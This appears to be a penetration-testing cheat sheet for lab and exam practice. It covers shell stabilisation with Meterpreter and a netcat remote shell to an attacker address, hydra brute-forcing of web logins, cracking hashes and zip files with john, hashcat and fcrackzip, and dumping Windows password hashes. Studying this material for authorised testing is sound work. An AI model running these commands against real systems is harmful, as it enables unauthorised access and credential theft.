METHOD: Meterpreter
1. `meterpreter> ps`: Find all running processes on the box.
2. `meterpreter> migrate [pid]`: Migrate your unstable shell to another process e.g. `explorer.exe`.
3. Your shell should be stable now.  

__########### WARNING: METERPRETER IS RESTRICTED IN THE EXAM ###########__


METHOD: Transfer netcat
1. Set up listener on attacker box `nc -nvlp 4444`.
2. Transfer nc/nc.exe to /temp or a dir with write privileges.
3. Execute bind shell `nc 10.11.0.222 4444 -e /bin/bash`.
4. You are now connected in a separate process that is stable.

METHOD: Locate process-killing script and edit it.
1. Find the script that detects/triggers killing of the vulnerable service.
2. Edit the script so it won't kill the service.
3. Your shell should be stable now.

__Cracking Web Pages__

Basic Authentication (e.g. /xampp logins):
```bash
$ hydra -l [username] -P [password file] -s [port] [target] [method] [path]
$ hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 80 10.11.1.223 http-get /xampp
```

__Cracking Hashes__

Useful Websites (has worked before):
* https://hashkiller.co.uk/Cracker/NTLM

John the Ripper (worked in labs):
```bash
# This requires you to have an /etc/shadow and /etc/passwd pair.
# Example:
#   /etc/paswd  => bob:x:500:500::/home/bob:/bin/bash
#   /etc/shadow => bob:$1${salt}${pass}:16903:0:99999:7:::
$ unshadow passwd shadow > hashes.txt
$ john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Hashcat:
```
$ hashcat -h | grep -i [hash you want to crack]     # find hash input number
$ hashcat -m 5600 /path/to/hash /path/to/wordlist   # 5600 = specify NTLMv2 hash
```

__Password Dumping__

Windows:
* `pwdump.exe`: dump password hashes.
  * How to use pwdump: https://xtraweb.wordpress.com/how-to-dump-windows-password-using-pwdump/
* `fgdump.exe`: dump password hashes and cached credentials.


__ZIP Files__

Brute-force passworded zips:
```
$ fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' passwords.zip
```

__Hexdump investigation__

Microsoft Acccess .mdb files:
```
# Hexdump
$ mdb-hexdump database.mdb > hexdump.txt

# Upload hexdump to online reader + search "admin" "password" etc.
https://www.onlinehexeditor.com
https://hexed.it
```

__strings__

Strings command finds all printable strings in an object, binary or file.  
This could reveal credentials or useful information.
```bash
$ strings [ filename ]
```

__Metadata__

```
$ exiftools
$ hexdump
$ binwalk
```

